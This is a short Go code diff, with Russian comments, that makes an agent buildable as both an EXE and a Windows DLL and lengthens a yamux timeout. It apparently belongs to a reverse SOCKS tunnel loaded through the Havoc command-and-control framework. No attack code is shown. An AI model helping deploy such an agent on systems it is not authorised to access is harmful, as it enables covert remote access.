@@ -145,7 +145,10 @@ func (f *failoverState) getCurrentServerName() string {
 	return f.servers[f.currentIdx]
 }
 
-func main() {
+// mainImpl — основная точка входа agent (EXE и DLL).
+// EXE (build !cgo): main_exe.go → mainImpl(). DLL (cgo+windows): havoc_dll.go
+// DllMain читает args из lpvReserved (base64), выставляет os.Args → mainImpl().
+func mainImpl() {
 	var opts AppOptions
 
 	// ========================================
@@ -163,7 +166,7 @@ func main() {
 	defaultRect := 30
 	defaultFullCyclePause := 7200
 	defaultYamuxKeepalive := 30
-	defaultYamuxTimeout := 10
+	defaultYamuxTimeout := 300
 	defaultSocksAuthEnabled := false
 	defaultSocksAuthUser := ""
 	defaultSocksAuthPass := ""
